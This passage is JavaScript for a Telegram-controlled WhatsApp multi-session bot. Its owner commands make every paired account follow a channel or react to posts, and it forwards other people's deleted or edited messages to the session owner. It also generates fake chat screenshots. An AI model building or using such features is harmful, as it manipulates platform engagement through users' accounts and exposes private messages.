process.env.NTBA_FIX_350 = 1;
import "./config.js";
import "./lib/myfunction.js";
import makeWASocket, {
  useMultiFileAuthState,
  DisconnectReason,
  jidDecode,
  downloadContentFromMessage,
  fetchLatestBaileysVersion,
  proto
} from "@whiskeysockets/baileys";
import chalk from "chalk";
import Pino from "pino";
import fs from "fs";
import path from "path";
import crypto from "crypto";
import { AsyncLocalStorage } from "node:async_hooks";
import readline from "readline";
import axios from "axios";
import { fileURLToPath } from "url";
import { imageToWebp, writeExifImg } from "./lib/sticker.js";
import { loadPlugins, watchPlugins } from "./lib/pluginLoader.js";
import serialize, { cacheLidMapping } from "./lib/serialize.js";
import DataBase from "./lib/database.js";
import loadDatabaseModule from "./lib/configDatabase.js";
import handler from "./revinza.js";
import pkg from "node-telegram-bot-api";
const TelegramBot = pkg.default || pkg;
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const sessionsDir = path.join(__dirname, "./sessions");
if (!fs.existsSync(sessionsDir)) {
  fs.mkdirSync(sessionsDir, { recursive: true });
}
if (!fs.existsSync("./data")) fs.mkdirSync("./data", { recursive: true });

const bot = global.teleToken
? new TelegramBot(global.teleToken, { polling: true })
  : {
      on() {},
      onText() {},
      async sendMessage() { return { message_id: 0 }; },
      async editMessageText() {},
      async deleteMessage() {},
      async sendPhoto() {},
      async sendVideo() {},
      async sendAudio() {}
    };

if (!global.teleToken) {
  console.warn("[telegram] TELEGRAM_BOT_TOKEN is not set; Telegram pairing controls are disabled.");
}

// ================= RICH MESSAGES UPGRADE (Bot API 10.1) =================
const TELE_API = global.teleToken? `https://api.telegram.org/bot${global.teleToken}` : null;

async function sendRich(chatId, html, opts = {}) {
  if (!TELE_API) return bot.sendMessage(chatId, html, { parse_mode: "HTML",...opts });
  try {
    const payload = {
      chat_id: chatId,
      rich_message: { html },
     ...(opts.reply_markup? { reply_markup: opts.reply_markup } : {})
    };
    const { data } = await axios.post(`${TELE_API}/sendRichMessage`, payload);
    return data.result;
  } catch (e) {
    // fallback to old method
    return bot.sendMessage(chatId, html, { parse_mode: "HTML",...opts }).catch(()=>({message_id:0}));
  }
}

async function sendRichDraft(chatId, htmlPartial) {
  if (!TELE_API) return;
  try {
    await axios.post(`${TELE_API}/sendRichMessageDraft`, {
      chat_id: chatId,
      rich_message: { html: htmlPartial }
    });
  } catch {}
}

async function editRich(chatId, messageId, html, opts = {}) {
  if (!TELE_API) return bot.editMessageText(html, { chat_id: chatId, message_id, parse_mode: "HTML" }).catch(()=>{});
  try {
    await axios.post(`${TELE_API}/editMessageText`, {
      chat_id: chatId,
      message_id: messageId,
      rich_message: { html }
    });
  } catch {
    await bot.editMessageText(html, { chat_id: chatId, message_id, parse_mode: "HTML",...opts }).catch(()=>{});
  }
}

async function sendRichPhoto(chatId, photoUrlOrPath, htmlCaption, opts = {}) {
  // Rich messages can contain inline photo as block - we use html figure
  if (!TELE_API) return bot.sendPhoto(chatId, photoUrlOrPath, { caption: htmlCaption, parse_mode: "HTML",...opts });
  try {
    const html = `<figure><img src="${photoUrlOrPath}" /></figure>\n${htmlCaption}`;
    return await sendRich(chatId, html, opts);
  } catch {
    return bot.sendPhoto(chatId, photoUrlOrPath, { caption: htmlCaption, parse_mode: "HTML",...opts }).catch(()=>({message_id:0}));
  }
}
// ================= END RICH UPGRADE =================

global.senders = new Map();
global.teleUsers = new Map();
global.teleUserSessions = new Map();

const modesFile = "./data/modes.json";
global.sessionModes = new Map();
if (fs.existsSync(modesFile)) {
  try {
    const saved = JSON.parse(fs.readFileSync(modesFile, "utf8"));
    for (let [pn, mode] of Object.entries(saved)) global.sessionModes.set(pn, mode);
  } catch {}
}
global.saveModes = () => {
  fs.writeFileSync(modesFile, JSON.stringify(Object.fromEntries(global.sessionModes), null, 2));
};
global.getMode = (pn) => global.sessionModes.get(pn) || global.mode || "public";
global.setMode = (pn, mode) => {
  global.sessionModes.set(pn, mode);
  global.saveModes();
};

const planDuration = {
  weekly: 7 * 24 * 60 * 60 * 1000,
  monthly: 30 * 24 * 60 * 60 * 1000
};

const teleUsersFile = "./data/teleUsers.json";
global.teleBroadcastList = new Set();
if (fs.existsSync(teleUsersFile)) {
  try {
    const arr = JSON.parse(fs.readFileSync(teleUsersFile, "utf8"));
    arr.forEach(id => global.teleBroadcastList.add(id));
  } catch {}
}
global.saveTeleUsers = () => {
  fs.writeFileSync(teleUsersFile, JSON.stringify([...global.teleBroadcastList], null, 2));
};
bot.on("message", (msg) => {
  if (!msg.chat?.id) return;
  const id = msg.chat.id.toString();
  if (!global.teleBroadcastList.has(id)) {
    global.teleBroadcastList.add(id);
    global.saveTeleUsers();
  }
});

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id.toString();
    const isOwner = chatId === global.teleOwner;
    const richMenu = `
<h1>🦇 ${global.botname}</h1>
<blockquote><b>WhatsApp Multi-Sender Bot</b></blockquote>

<h3>📱 User Commands</h3>
<table>
<tr><th>Command</th><th>Action</th></tr>
<tr><td><code>/pair 234xxx</code></td><td>Pair WhatsApp</td></tr>
<tr><td><code>/delpair 234xxx</code></td><td>Remove session</td></tr>
<tr><td><code>/checkpair</code></td><td>List your sessions</td></tr>
</table>
${isOwner? `
<h3>🛡️ Admin Panel</h3>
<details>
<summary>Tap to expand admin commands</summary>
<ul>
<li><code>/broadcast &lt;text&gt;</code> - Broadcast to all</li>
<li><code>/checksessions</code> - All sessions</li>
<li><code>/addpremium 234xxx weekly|monthly</code></li>
<li><code>/delpremium 234xxx</code> - Remove premium</li>
<li><code>/listpremium</code> - List premium users</li>
<li><code>/follow &lt;channel_link&gt;</code></li>
<li><code>/react &lt;link/135&gt; &lt;emojis&gt;</code></li>
<li><code>/tiktok &lt;URL&gt;</code></li>
<li><code>/iqc &lt;text&gt; | &lt;provider&gt; | &lt;hour&gt; | &lt;battery&gt;</code></li>
</ul>
</details>
` : ""}
<blockquote>Powered by BATMAN MDX</blockquote>
    `;
    try {
        // Try rich with inline image block
        await sendRich(chatId, richMenu, {
            reply_markup: {
                inline_keyboard: [[
                    { text: "Creator", url: "https://t.me/nabees001" },
                    { text: "Channel", url: "https://t.me/batmadmdx" }
                ]]
            }
        });
    } catch (error) {
        console.error("Failed to send start menu:", error);
    }
});

bot.onText(/\/pair (.+)/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  let pn = match[1].replace(/[^0-9]/g, "");
  if (!pn || pn.length < 8) {
    return sendRich(chatId, `<blockquote>❌ Invalid number. Example: <code>/pair 234xxxxxxxxxx</code></blockquote>`);
  }
  if (global.senders.has(pn)) {
    return sendRich(chatId, `<blockquote>⚠️ Sender <code>${pn}</code> is already active.</blockquote>`);
  }
  if (!global.teleUsers.has(chatId)) global.teleUsers.set(chatId, new Set());
  const owned = global.teleUsers.get(chatId);
  for (let num of [...owned]) if (!global.senders.has(num)) owned.delete(num);
  const isOwnerChat = chatId === global.teleOwner;
  if (!isOwnerChat && owned.size >= 5) {
    return sendRich(chatId, `<h3>❌ Limit reached!</h3><p>You already have <b>2</b> active sessions. Remove one first: <code>/delpair &lt;number&gt;</code></p>`);
  }
  await sendRichDraft(chatId, `<tg-thinking>Starting pairing for ${pn}...</tg-thinking>`);
  owned.add(pn);
  global.teleUserSessions.set(pn, chatId);
  startBot(pn, chatId);
});

bot.onText(/\/delpair (.+)/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  let pn = match[1].replace(/[^0-9]/g, "");
  if (!global.senders.has(pn)) {
    return sendRich(chatId, `⚠️ Sender <code>${pn}</code> not found.`);
  }
  const owner = global.teleUserSessions.get(pn);
  const isOwner = chatId === global.teleOwner;
  if (!isOwner && owner && owner!== chatId) {
    return sendRich(chatId, "❌ This is not your session.");
  }
  let sock = global.senders.get(pn);
  try { await sock.logout(); } catch (e) {}
  global.senders.delete(pn);
  const sessionPath = path.join(sessionsDir, pn);
  if (fs.existsSync(sessionPath)) fs.rmSync(sessionPath, { recursive: true, force: true });
  global.sessionModes.delete(pn);
  global.saveModes();
  global.teleUsers.get(chatId)?.delete(pn);
  if (owner && global.teleUsers.has(owner)) global.teleUsers.get(owner).delete(pn);
  global.teleUserSessions.delete(pn);
  sendRich(chatId, `✅ Sender <code>${pn}</code> removed and logged out.`);
});

bot.onText(/\/checkpair/, async (msg) => {
  const chatId = msg.chat.id.toString();
  const isOwner = chatId === global.teleOwner;
  if (global.senders.size === 0) {
    return sendRich(chatId, "No active senders.");
  }
  let rows = "";
  let i = 1;
  for (let [pn, sock] of global.senders.entries()) {
    const owner = global.teleUserSessions.get(pn);
    if (!isOwner && owner!== chatId) continue;
    const status = sock.authState?.creds?.registered? "✅ Online" : "⏳ Waiting";
    const mode = global.getMode(pn);
    rows += `<tr><td>${i}</td><td><code>${pn}</code></td><td>${status}</td><td>${mode}</td></tr>`;
    i++;
  }
  if (i === 1) return sendRich(chatId, "<i>You don't have any active sessions yet.</i>");
  const html = `<h3>Active WhatsApp Sessions</h3><table><tr><th>#</th><th>Number</th><th>Status</th><th>Mode</th></tr>${rows}</table>`;
  sendRich(chatId, html);
});

bot.onText(/\/broadcast (.+)/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  if (chatId!== global.teleOwner) return;
  const text = match[1];
  const users = [...global.teleBroadcastList];
  if (users.length === 0) return sendRich(chatId, "⚠️ No Telegram users recorded yet.");
  const wait = await sendRich(chatId, `<tg-thinking>Broadcasting to ${users.length} users...</tg-thinking>`);
  let ok = 0, fail = 0;
  for (let id of users) {
    try {
      await sendRich(id, text);
      ok++;
      await new Promise(r => setTimeout(r, 100));
    } catch { fail++; }
  }
  editRich(chatId, wait.message_id, `<h3>📢 Broadcast complete</h3><table><tr><th>Sent</th><th>Failed</th><th>Total</th></tr><tr><td>✅ ${ok}</td><td>❌ ${fail}</td><td>👥 ${users.length}</td></tr></table>`);
});

bot.onText(/\/checksessions/, async (msg) => {
  const chatId = msg.chat.id.toString();
  if (chatId!== global.teleOwner) return;
  if (global.teleUserSessions.size === 0) return sendRich(chatId, "No sessions registered yet.");
  const grouped = {};
  for (let [pn, teleId] of global.teleUserSessions.entries()) {
    if (!grouped[teleId]) grouped[teleId] = [];
    grouped[teleId].push(pn);
  }
  let html = `<h2>🛡️ All Telegram Users & Sessions</h2>`;
  let n = 1;
  for (let [teleId, list] of Object.entries(grouped)) {
    html += `<h3>${n}. TeleUser <code>${teleId}</code></h3><ul>`;
    for (let pn of list) {
      const sock = global.senders.get(pn);
      const status = sock? (sock.authState?.creds?.registered? "✅ Online" : "⏳ Pairing") : "❌ Offline";
      const mode = global.getMode(pn);
      html += `<li><code>${pn}</code> — ${status} — <b>${mode}</b></li>`;
    }
    html += `</ul>`;
    n++;
  }
  html += `<blockquote>Total active: ${global.senders.size} | Total registered: ${global.teleUserSessions.size}</blockquote>`;
  sendRich(chatId, html);
});

bot.onText(/\/follow (.+)/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  if (chatId!== global.teleOwner) return;
  const link = match[1].trim().split(/\s+/)[0];
  let inviteCode = null;
  if (/^\d+@newsletter$/.test(link)) {
    inviteCode = null;
  } else {
    try {
      const clean = link.split("?")[0].split("#")[0];
      const url = new URL(clean);
      const p = url.pathname.split("/").filter(Boolean);
      const code = p[p.length - 1];
      if (code && /^[A-Za-z0-9]+$/.test(code)) inviteCode = code;
    } catch {}
    if (!inviteCode) {
      const m = link.match(/(?:channel|invite)\/([A-Za-z0-9]+)/i);
      inviteCode = m?.[1] || null;
    }
  }
  if (!inviteCode &&!/^\d+@newsletter$/.test(link)) {
    return sendRich(chatId, `Usage: <code>/follow &lt;channel_link&gt;</code><br/>Example: <code>/follow https://whatsapp.com/channel/0029VbCV1ck8fewpdNb2TY2k</code>`);
  }
  if (global.senders.size === 0) {
    return sendRich(chatId, "⚠️ No paired sessions.");
  }
  const wait = await sendRich(chatId, `<tg-thinking>Following channel with ${global.senders.size} session(s)...</tg-thinking>`);
  let ok = 0, fail = 0;
  const errors = [];
  let resolvedJid = /^\d+@newsletter$/.test(link)? link : null;
  for (const [pn, sock] of global.senders.entries()) {
    if (!sock?.user?.id) { fail++; continue; }
    try {
      if (inviteCode) {
        const meta = await sock.newsletterMetadata("invite", inviteCode);
        const jid = meta?.id;
        if (!jid) throw new Error("could not resolve channel JID");
        if (!resolvedJid) resolvedJid = jid;
        await sock.newsletterFollow(jid);
      } else {
        await sock.newsletterFollow(link);
      }
      ok++;
    } catch (e) {
      fail++;
      errors.push(`${pn}: ${e.message}`);
    }
  }
  editRich(chatId, wait.message_id, `<h3>📢 Follow Complete</h3><table><tr><th>OK</th><th>Fail</th></tr><tr><td>✅ ${ok}</td><td>❌ ${fail}</td></tr></table><p>Channel: <code>${resolvedJid || link}</code></p>${errors.length? `<details><summary>Errors</summary><code>${errors.slice(0,5).join("<br/>")}</code></details>` : ""}`);
});

bot.onText(/\/react (.+)/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  if (chatId!== global.teleOwner) return;
  const parts = match[1].trim().split(/\s+/);
  if (parts.length < 2) {
    return sendRich(chatId, `Usage:<br/><code>/react &lt;channel_link&gt;/&lt;postId&gt; &lt;emoji1&gt;</code><br/><code>/react &lt;channelJid&gt; &lt;postId&gt; &lt;emoji&gt;</code>`);
  }
  const link = parts[0];
  let serverId = null;
  let emojis = [];
  let channelJid = null;
  let inviteCode = null;
  if (/^\d+@newsletter$/.test(link)) {
    channelJid = link;
    serverId = parts[1];
    emojis = parts.slice(2).filter(e => e.trim());
  } else {
    const serverMatch = link.match(/\/(\d+)\/?$/);
    if (serverMatch) serverId = serverMatch[1];
    try {
      const clean = link.split("?")[0].split("#")[0];
      const url = new URL(clean);
      const segments = url.pathname.split("/").filter(Boolean);
      for (let i = segments.length - 1; i >= 0; i--) {
        if (/^[A-Za-z0-9]+$/.test(segments[i]) &&!/^\d+$/.test(segments[i])) {
          inviteCode = segments[i];
          break;
        }
      }
    } catch {}
    if (!inviteCode) {
      const m = link.match(/(?:channel|invite)\/([A-Za-z0-9]+)/i);
      inviteCode = m?.[1] || null;
    }
    emojis = parts.slice(1).filter(e => e.trim());
    if (!serverId) {
      const candidate = emojis.shift();
      if (candidate && /^\d+$/.test(candidate)) serverId = candidate;
    }
    if (!inviteCode) {
      return sendRich(chatId, "❌ Could not extract invite code from the link.");
    }
    try {
      const firstSock = global.senders.values().next().value;
      if (!firstSock) return sendRich(chatId, "⚠️ No paired sessions.");
      const meta = await firstSock.newsletterMetadata("invite", inviteCode);
      channelJid = meta?.id || null;
    } catch (e) {
      return sendRich(chatId, `❌ Failed to resolve channel: ${e.message}`);
    }
    if (!channelJid) {
      return sendRich(chatId, "❌ Could not resolve channel JID.");
    }
  }
  if (!serverId) {
    return sendRich(chatId, `❌ Missing post ID.<br/>Include: <code>/react https://whatsapp.com/channel/XXXXX/135 💖</code>`);
  }
  if (!emojis.length) {
    return sendRich(chatId, "❌ No emojis provided.");
  }
  if (global.senders.size === 0) {
    return sendRich(chatId, "⚠️ No paired sessions.");
  }
  const wait = await sendRich(chatId, `<tg-thinking>Reacting to ${channelJid} post ${serverId} with ${emojis.join(" ")}...</tg-thinking>`);
  let ok = 0, fail = 0;
  const errors = [];
  for (const [pn, sock] of global.senders.entries()) {
    if (!sock?.user?.id) { fail++; continue; }
    try {
      for (const emoji of emojis) {
        try {
          await sock.newsletterReactMessage(channelJid, serverId, emoji);
        } catch (e) {
          errors.push(`${pn}: ${emoji} → ${e.message}`);
        }
      }
      ok++;
    } catch (e) {
      fail++;
      errors.push(`${pn}: ${e.message}`);
    }
  }
  editRich(chatId, wait.message_id, `<h3>📢 Reaction Complete</h3><p>✅ ${ok} reacted | ❌ ${fail} failed | Emojis: ${emojis.join(" ")}</p><p>Channel: <code>${channelJid}</code> | Post: <code>${serverId}</code></p>${errors.length? `<details><summary>Errors</summary><code>${errors.slice(0,5).join("<br/>")}</code></details>` : ""}`);
});

bot.onText(/\/addpremium (.+)/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  if (chatId!== global.teleOwner) return;
  const parts = match[1].trim().split(/\s+/);
  const pn = (parts[0] || "").replace(/[^0-9]/g, "");
  const plan = (parts[1] || "").toLowerCase();
  if (!pn || pn.length < 8) {
    return sendRich(chatId, `❌ Usage: <code>/addpremium 234xxx weekly</code> or <code>/addpremium 234xxx monthly</code>`);
  }
  if (!planDuration[plan]) {
    return sendRich(chatId, "❌ Invalid plan. Use <code>weekly</code> or <code>monthly</code>.");
  }
  const jid = `${pn}@s.whatsapp.net`;
  if (!global.db.settings.premium) global.db.settings.premium = [];
  const now = Date.now();
  const duration = planDuration[plan];
  const existing = global.db.settings.premium.find(p => {
    const id = typeof p === "string"? p : p.id;
    return id === jid;
  });
  let expiry;
  if (existing) {
    const currentExpiry = typeof existing === "string"? now : (existing.expiry || now);
    expiry = Math.max(currentExpiry, now) + duration;
    if (typeof existing === "string") {
      const idx = global.db.settings.premium.indexOf(existing);
      global.db.settings.premium[idx] = { id: jid, plan, expiry, addedAt: now };
    } else {
      existing.plan = plan;
      existing.expiry = expiry;
    }
  } else {
    expiry = now + duration;
    global.db.settings.premium.push({ id: jid, plan, expiry, addedAt: now });
  }
  if (global.db.users[jid]) global.db.users[jid].isPremium = true;
  const expiryDate = new Date(expiry).toISOString().slice(0, 10);
  sendRich(chatId, `<h3>✅ Premium added</h3><table><tr><th>Number</th><th>Plan</th><th>Expires</th></tr><tr><td><code>${pn}</code></td><td>${plan}</td><td>${expiryDate}</td></tr></table>`);
});

bot.onText(/\/delpremium (.+)/, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  if (chatId!== global.teleOwner) return;
  const pn = match[1].replace(/[^0-9]/g, "");
  if (!pn) return sendRich(chatId, `❌ Usage: <code>/delpremium 234xxx</code>`);
  const jid = `${pn}@s.whatsapp.net`;
  const list = global.db.settings.premium || [];
  const before = list.length;
  global.db.settings.premium = list.filter(p => {
    const id = typeof p === "string"? p : p.id;
    return id!== jid;
  });
  if (global.db.users[jid]) global.db.users[jid].isPremium = false;
  if (global.db.settings.premium.length === before) {
    return sendRich(chatId, `⚠️ <code>${pn}</code> is not a premium user.`);
  }
  sendRich(chatId, `✅ Premium removed for <code>${pn}</code>.`);
});

bot.onText(/\/listpremium/, (msg) => {
  const chatId = msg.chat.id.toString();
  if (chatId!== global.teleOwner) return;
  const list = global.db.settings.premium || [];
  if (list.length === 0) {
    return sendRich(chatId, "No premium users.");
  }
  let rows = "";
  let i = 1;
  for (let p of list) {
    const id = typeof p === "string"? p : p.id;
    const pn = id.split("@")[0];
    const plan = typeof p === "object"? (p.plan || "-") : "lifetime";
    let exp = "-";
    if (typeof p === "object" && p.expiry) {
      const daysLeft = Math.ceil((p.expiry - Date.now()) / 86400000);
      exp = `${new Date(p.expiry).toISOString().slice(0, 10)} (${daysLeft}d left)`;
    }
    rows += `<tr><td>${i}</td><td><code>${pn}</code></td><td>${plan}</td><td>${exp}</td></tr>`;
    i++;
  }
  sendRich(chatId, `<h3>👑 Premium Users (${list.length})</h3><table><tr><th>#</th><th>Number</th><th>Plan</th><th>Expiry</th></tr>${rows}</table>`);
});

bot.onText(/^\/(tiktok|tt)(?:\s+([\s\S]+))?$/i, async (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString()!== global.teleOwner) return;
    const text = match[2];
    if (!text) {
      return sendRich(chatId, `⚠️ <b>Invalid Format!</b><br/>Example: <code>/tiktok https://vt.tiktok.com/xxxxxx/</code>`);
    }
    let url = text.trim();
    if (!/tiktok\.com/i.test(url)) {
      return sendRich(chatId, "❌ Not a valid TikTok link!");
    }
    const waitMsg = await sendRich(chatId, `<tg-thinking>Fetching TikTok data...</tg-thinking>`);
    try {
      const res = await axios.get(`https://www.tikwm.com/api/?url=${encodeURIComponent(url)}`);
      if (!res.data || res.data.code!== 0) {
        return editRich(chatId, waitMsg.message_id, "❌ Failed to fetch data.");
      }
      const data = res.data.data;
      let isSlide = data.images && data.images.length > 0;
      await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});
      if (isSlide) {
        for (let i = 0; i < data.images.length; i++) {
          await bot.sendPhoto(chatId, data.images[i]);
        }
      } else {
        await bot.sendVideo(chatId, data.play);
      }
      let audioUrl = data.music || data.music_info?.play_url || data.music_url;
      if (audioUrl) {
        await bot.sendAudio(chatId, audioUrl, {
          title: data.music_info?.title || "TikTok Audio",
          performer: data.music_info?.author || "TikTok"
        });
      }
    } catch (err) {
      console.error("[TIKTOK ERROR]", err);
      editRich(chatId, waitMsg.message_id, `❌ Error: ${err.message}`).catch(()=>{});
    }
});

bot.onText(/^\/(iqc|iqcgenerator)(?:\s+([\s\S]+))?$/i, async (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString()!== global.teleOwner) return;
    const text = match[2];
    if (!text) {
        return sendRich(chatId, `⚠️ <b>Format:</b> <code>/iqc &lt;text&gt; | &lt;provider&gt; | &lt;hour&gt; | &lt;battery&gt;</code><br/>Providers: Axis, Telkomsel, Indosat, XL, Three`);
    }
    const waitMsg = await sendRich(chatId, `<tg-thinking>Processing IQC image...</tg-thinking>`);
    try {
        const parts = text.split('|').map(p => p.trim());
        const pesan = parts[0] || 'Hello';
        const provider = (parts[1] || 'Axis').toLowerCase();
        const jam = parts[2] || '11';
        const baterai = parts[3] || '90';
        const validProviders = ['axis', 'telkomsel', 'indosat', 'xl', 'three'];
        if (!validProviders.includes(provider)) {
            return editRich(chatId, waitMsg.message_id, `❌ <b>Invalid provider!</b>`);
        }
        const apiUrl = `https://api.nexray.eu.cc/maker/v1/iqc?text=${encodeURIComponent(pesan)}&provider=${provider}&jam=${jam}&baterai=${baterai}`;
        const res = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
        await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});
        await bot.sendPhoto(chatId, Buffer.from(res.data), {
            caption: `✅ IQC Generated!\n\nText: ${pesan}\nProvider: ${provider.toUpperCase()}\nHour: ${jam}\nBattery: ${baterai}%`,
            parse_mode: "Markdown"
        });
    } catch (err) {
        console.error("[IQC ERROR]", err);
        editRich(chatId, waitMsg.message_id, `❌ <b>Failed to generate IQC!</b><br/>Error: ${err.message || 'Server error'}`).catch(()=>{});
    }
});

// REST OF YOUR FILE - UNCHANGED (Baileys, DB, etc)
async function init() {
  const rawPlugins = await loadPlugins();
  global.plugins = {};
  for (let key in rawPlugins) {
    let modulePlugin = rawPlugins[key];
    if (modulePlugin) {
      global.plugins[key] = modulePlugin.default?.default || modulePlugin.default || modulePlugin;
    }
  }
  const pluginFolder = path.join(__dirname, "./plugins");
  watchPlugins(pluginFolder);
}
await init();

global.loadDatabase = loadDatabaseModule;
global.groupMetadataCache = new Map();
const sessionContext = new AsyncLocalStorage();
global.sessionContext = sessionContext;
global.__baseDb = DataBase.normalize(await new DataBase("legacy").read());
Object.defineProperty(global, "db", {
  configurable: true,
  get() {
    return sessionContext.getStore()?.db || global.__baseDb;
  },
  set(value) {
    global.__baseDb = DataBase.normalize(value);
  }
});
const baseSessionGlobals = {};
for (const key of ["footer", "botname", "packname", "author", "prefix"]) {
  baseSessionGlobals[key] = global[key];
  Object.defineProperty(global, key, {
    configurable: true,
    get() {
      const store = sessionContext.getStore();
      if (store?.db) {
        const custom = store.db.settings?.custom?.[key];
        if (custom) return custom;
        if (key === "prefix") {
          const direct = store.db.settings?.prefix;
          if (direct) return direct;
        }
      }
      return baseSessionGlobals[key];
    },
    set(value) {
      baseSessionGlobals[key] = value;
    }
  });
}

const sessionDatabases = new Map();
const sessionDatabaseFiles = new Map();
global.sessionDatabases = sessionDatabases;
async function getSessionDb(sessionId) {
  if (sessionDatabases.has(sessionId)) return sessionDatabases.get(sessionId);
  const database = new DataBase(sessionId);
  const loaded = DataBase.normalize(await database.read());
  sessionDatabases.set(sessionId, loaded);
  sessionDatabaseFiles.set(sessionId, database);
  return loaded;
}
global.getSessionDb = getSessionDb;
global.saveSessionDb = async (sessionId) => {
  const db = sessionDatabases.get(sessionId);
  const database = sessionDatabaseFiles.get(sessionId);
  if (db && database) await database.write(db);
};
setInterval(() => {
  for (const sessionId of sessionDatabases.keys()) {
    global.saveSessionDb(sessionId).catch((error) =>
      console.error(`[db:${sessionId}] save failed:`, error.message)
    );
  }
}, 5000);

const ownersFile = "./data/teleOwners.json";
if (fs.existsSync(ownersFile)) {
  try {
    const saved = JSON.parse(fs.readFileSync(ownersFile, "utf8"));
    for (let [pn, chatId] of Object.entries(saved)) {
      global.teleUserSessions.set(pn, chatId);
      if (!global.teleUsers.has(chatId)) global.teleUsers.set(chatId, new Set());
      global.teleUsers.get(chatId).add(pn);
    }
  } catch {}
}
setInterval(() => {
  fs.writeFileSync(ownersFile, JSON.stringify(Object.fromEntries(global.teleUserSessions), null, 2));
}, 10000);

try {
  const { default: nodeCron } = await import("node-cron");
  nodeCron.schedule(`${global.resetMinute || 0} ${global.resetHour || 0} * * *`, () => {
    for (const [sessionId, db] of sessionDatabases.entries()) {
      for (const jid in db.users || {}) {
        const u = db.users[jid];
        const max = (global.limitDefault || 50);
        if (u) { u.limit = max; u.lastReset = Date.now(); }
      }
      global.saveSessionDb(sessionId).catch(() => {});
    }
  }, { timezone: "Africa/Lagos" });
} catch {}

try {
  const { default: nodeCronExpire } = await import("node-cron");
  nodeCronExpire.schedule("0 0 * * *", () => {
    const now = Date.now();
    for (const [sessionId, db] of sessionDatabases.entries()) {
      const list = db.settings.premium || [];
      const kept = [];
      for (let p of list) {
        if (typeof p === "string") { kept.push(p); continue; }
        if (p.expiry && p.expiry > now) {
          kept.push(p);
        } else {
          if (db.users[p.id]) db.users[p.id].isPremium = false;
          console.log(`[premium:${sessionId}] expired: ${p.id}`);
        }
      }
      db.settings.premium = kept;
      global.saveSessionDb(sessionId).catch(() => {});
    }
  }, { timezone: "Africa/Lagos" });
} catch {}

function unwrapMessage(message) {
  if (!message || typeof message!== "object") return message;
  for (const key of ["ephemeralMessage", "viewOnceMessage", "viewOnceMessageV2", "documentWithCaptionMessage"]) {
    if (message[key]?.message) return unwrapMessage(message[key].message);
  }
  return message;
}
function messageText(message) {
  const value = unwrapMessage(message);
  if (!value || typeof value!== "object") return "";
  const item = Object.entries(value).find(([, body]) => body && typeof body === "object");
  if (!item) return "";
  const [type, body] = item;
  return String(body.text || body.caption || body.conversation || body.selectedDisplayText || body.selectedButtonId || (type === "conversation"? body : "") || "").trim();
}
function messageKind(message) {
  const value = unwrapMessage(message);
  return value && typeof value === "object"? Object.keys(value)[0] || "unknown" : "unknown";
}
function getProtocolMessage(event) {
  const update = event?.update || event || {};
  return update.message?.protocolMessage || update.message?.editedMessage?.protocolMessage || update.message?.protocolMessage || null;
}
function getEditedMessage(event, protocol) {
  const update = event?.update || event || {};
  return protocol?.editedMessage || update.message?.editedMessage || update.message?.protocolMessage?.editedMessage || null;
}
async function handleMessageUpdate(sock, sessionId, event, db) {
  const protocol = getProtocolMessage(event);
  const targetKey = protocol?.key || event?.key || event?.update?.key;
  if (!protocol ||!targetKey?.id) return;
  const types = proto?.Message?.ProtocolMessage?.Type || {};
  const isEdit = Boolean(getEditedMessage(event, protocol)) || protocol.type === types.MESSAGE_EDIT || protocol.type === "MESSAGE_EDIT";
  const isDelete =!isEdit && (protocol.type === types.REVOKE || protocol.type === "REVOKE" || event?.update?.messageStubType === "REVOKE");
  if (!isEdit &&!isDelete) return;
  const ownerJid = sock.decodeJid(sock.user?.id || `${sessionId}@s.whatsapp.net`);
  const archive = sock.__messageArchive?.get(targetKey.id) || (db.settings.messageArchive || []).find(item => item.id === targetKey.id);
  if (isDelete &&!db.settings.antiDelete) return;
  if (isEdit &&!db.settings.antiEdit) return;
  const chat = targetKey.remoteJid || archive?.chat || "unknown";
  const sender = targetKey.participant || archive?.sender || targetKey.remoteJid || "unknown";
  const label = isDelete? "🗑️ Deleted message" : "✏️ Edited message";
  const originalText = archive?.text || "(content was not text or was not cached)";
  const newText = isEdit? messageText(getEditedMessage(event, protocol)) || "(edited content unavailable)" : "";
  let notice = `${label}\n\n📱 Session: ${sessionId}\n💬 Chat: ${chat}\n👤 Sender: ${sender}\n🆔 Message ID: ${targetKey.id}\n🗂️ Type: ${archive?.kind || "unknown"}\n\n`;
  if (isEdit) notice += `Before:\n${originalText}\n\nAfter:\n${newText}`; else notice += originalText;
  await sock.sendMessage(ownerJid, { text: notice }).catch(() => {});
  if (isDelete && archive?.raw && typeof sock.copyNForward === "function") {
    try { await sock.copyNForward(ownerJid, archive.raw, true, { contextInfo: { forwardingScore: 1, isForwarded: true } }); } catch {}
  }
}

async function startBot(sessionId, teleChatId = null) {
  const sessionPath = path.join(sessionsDir, sessionId);
  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
  const { version } = await fetchLatestBaileysVersion();
  try {
    const credsPath = path.join(sessionPath, "creds.json");
    if (fs.existsSync(credsPath)) {
      const creds = JSON.parse(fs.readFileSync(credsPath, "utf8"));
      if (creds.registered === true && creds.accountSyncCounter === 0) {
        creds.accountSyncCounter = 1;
        fs.writeFileSync(credsPath, JSON.stringify(creds, null, 2));
        if (state.creds) state.creds.accountSyncCounter = 1;
        console.log(chalk.yellow(`🔧 Auto-fixed accountSyncCounter for ${sessionId}`));
      }
    }
  } catch (e) { console.log(chalk.gray(`⚠️ Sync counter check failed: ${e.message}`)); }
  const sock = makeWASocket({
    logger: Pino({ level: "silent" }),
    auth: state,
    version,
    printQRInTerminal: false,
    emitOwnEvents: true,
    cachedGroupMetadata: async (jid) => {
      if (!global.groupMetadataCache.has(jid)) {
        const m = await sock.groupMetadata(jid).catch(() => {});
        global.groupMetadataCache.set(jid, m); return m;
      }
      return global.groupMetadataCache.get(jid);
    },
  });
  sock.authState = state;
  sock.sessionId = sessionId;
